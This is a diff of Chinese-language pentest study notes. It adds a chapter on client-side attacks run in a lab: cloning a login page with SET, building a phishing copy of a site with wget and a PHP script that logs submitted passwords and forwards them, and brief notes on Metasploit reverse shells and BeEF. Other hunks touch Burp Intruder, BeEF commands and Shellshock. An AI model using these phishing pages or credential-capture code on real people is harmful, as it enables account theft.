@@ -815,8 +815,7 @@ Hydra 是网络登录破解器，也就是在线的破解器,这意味着它可�
    
 ### 原理
 
-   Intruder 所做的是，修改请求的特定部分，并使用定义好的载荷替换这些部分的值。载荷可以是这
-   些东西:
+   Intruder 所做的是，修改请求的特定部分，并使用定义好的载荷替换这些部分的值。载荷可以是这些东西:
 
    + 简单列表：来自文件,由剪贴板传递或者写在文本框中的列表。
    
@@ -1139,11 +1138,12 @@ ExploitDB是一个面向全世界黑客的漏洞提交平台，该平台会公�
 5. 其他常用命令
 
    + `commands | Browser | Hooked Domain | Get Cookie`获取cookie
-+ `social engineering | pretty theft` 社会工程工具，允许攻击者模拟Facebook、YouTube等应用登录页面，诱使受害者输入用户名/密码。
-  
+
+   + `social engineering | pretty theft` 社会工程工具，允许攻击者模拟Facebook、YouTube等应用登录页面，诱使受害者输入用户名/密码。
+    
    + 打开摄像头
    
-+ 提取浏览器中存储的用户名/口令
+   + 提取浏览器中存储的用户名/口令
    + 将受害者浏览器作为代理
 
    
@@ -1258,7 +1258,7 @@ bash漏洞是由于bash在处理含有函数定义诸如”`() { :; }`“的环�
 
 **影响范围**
 
-bash版本低于4.3均存在该漏洞，并且可以为bash传递环境变量的程序均受影响，最典型的是bash写的CGI程序，客户端通过在请求字符串里加入构造的值，就可以轻松攻击运行CGI的服务器。
+bash版本低于4.3且支持向bash传递环境变量的程序均受影响，最典型的是bash写的CGI程序，客户端通过在请求字符串里加入构造的值，就可以轻松攻击运行CGI的服务器。
 
 目前大多数的网站很少用CGI了，所以问题不算太大。但是有很多的网络设备，如路由器、交换机等都使用了Perl或者其他语言编写的CGI程序，只要是底层调用了bash，那么就爱存在风险。
 
@@ -1424,3 +1424,125 @@ sslsplit -D -l connections.log -j sslsplit/ -S sslsplit/logdir/ -k certauth.key 
 ### 原理
 
 DNS劫持可以强制客户端浏览某个页面，可以用于web渗透。
+
+
+
+# 第九章 客户端攻击
+
+## 9.1 使用set创建密码收集器
+
+社会工程工具包（social-engineertookit）SET是一套工具，为执行针对人性的攻击而设计。这类攻击,包括网络钓鱼、邮件群发、SMS、伪造无线接入点、恶意网站、感染性媒体,以及其它。
+
+### 更新setoolkit
+
+kali中setoolkit的版本是8.0.1不是最新版，更新方法
+
+```
+git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
+cd setoolkit
+pip3 install -r requirements.txt
+python3 setup.py
+```
+
+可能会出现pip3：unknown command，安装pip3即可。
+
+### 克隆站点，搜集信息
+
+1. 启动setoolkit，`setoolkit`
+2. 依次选择1 ( Social-Engineering Attacks ) | 2 （Website Attack Vectors）| 3（Credential Harvester Attack Method）| 3（Site Cloner）
+
+![](pictures/setoolkit_1.png)
+
+会询问收集到的信息发送到哪个IP，这里输入kali虚拟机的ip地址192.168.254.130；接着会询问要克隆的URL，输入<http://192.168.2.167/dvwa/login.php>
+
+3. 在win7虚拟机中访问http://192.168.254.130，总是显示Apache2 Debian Default Page，百思不得其解。在物理主机上访问http://192.168.254.130可以显示dvwa登录页面，输入用户名/口令，点击login，页面再次重定向到真正的dvwa页面，输入的用户名口令显示在了kali虚拟机中。
+
+4. 按ctrl+c后，setoolkit提示了结果文件存放位置
+
+![](pictures/setoolkit_2.png)
+
+5. 书中介绍的index.html和post.php并未找到。
+
+
+
+## 9.2  使用保存的页面创建钓鱼网站
+
+使用set仅仅复制登录界面，在正确输入密码后再次重定向到登录页面会使用户产生怀疑。本节使用wget保存的站点，几乎含有所有导航，在输入正确用户名/密码后会登录原始站点。
+
+1. 使用wget保存站点
+
+```bash
+wget -r -P bodgeit_offline/ http://192.168.2.167/bodgeit/
+```
+
+2. 启动apache服务，`service apache2 start`，并将下载的站点复制到apache根目录，
+
+```bash
+cp -r bodgeit_offline/192.168.2.167/bodgeit/ /var/www/html/
+```
+
+3. vim修改/var/www/html/bodgeit/中的login.jsp文件，寻找下面的代码：
+
+```html
+<h3>Login</h3>
+Please enter your credentials: <br/><br/>
+<form method="POST">
+```
+
+修改为
+
+```html
+<h3>Login</h3>
+Please enter your credentials: <br/><br/>
+<form method="POST" action="post.php">
+```
+
+4. 在login.jsp相同目录下创建post.php文件，代码如下
+
+```html
+<?php
+$file = 'passwords_C00kb00k.txt';
+file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+$username=$_POST["username"];
+$password=$_POST["password"];
+$submit="Login"; ?>
+<body onload="frm1.submit.click()">
+<form name="frm1" id="frm1" method="POST"
+action="http://192.168.2.167/bodgeit/login.jsp">
+<input type="hidden" value="<?php echo $username;?>" name ="username">
+<input type="hidden" value="<?php echo $password;?>" name ="password">
+<input type="submit" value="<?php echo $submit;?>" name ="submit">
+</form>
+</body>
+```
+Web 服务器运行在 www-data 用户下,所以我们需要使这个用户为文件的所有者，便于它可被 web 服务器进程写入。
+
+5. 创建结果文件passwords_C00kb00k.txt，并修改权限
+
+```
+touch passwords_C00kb00k.txt
+chown www-data passwords_C00kb00k.txt
+```
+
+
+6. 在win7虚拟机中访问http://192.168.254.130/bodgeit/login.jsp，输入用户名口令（user@mail.com/password），点击login，成功登录到了192.168.2.167/bodgeit。
+7. 结果文件passwords_C00kb00k.txt中保存了捕获的用户名口令。
+
+## 9.3 使用metasploit创建反向shell并捕获连接
+
+使用metasploit生成木马可执行程序，诱导客户点击运行，本地metasploit即建立了反向shell。
+
+## 9.4 使用metasploit的browser_autopwn2攻击客户端
+
+利用browser_autopwn2执行攻击，可以获得cookie，浏览器版本等信息，并未发现特别厉害之处。
+
+## 9.5 使用BeEF建立shell
+
+win7虚拟机访问http://192.168.254.130:3000/demos/butcher/index.html，在kali虚拟机中打开beef面板（http://127.0.0.1:3000/ui/panel）。
+
+执行攻击 Current Browser | Commands | Social Engineering |Firefox Extension (Bindshell)客户机没有反应，在kali中`nc 192.168.254.128`超时。
+
+执行其他攻击是有结果的。
+
+
+
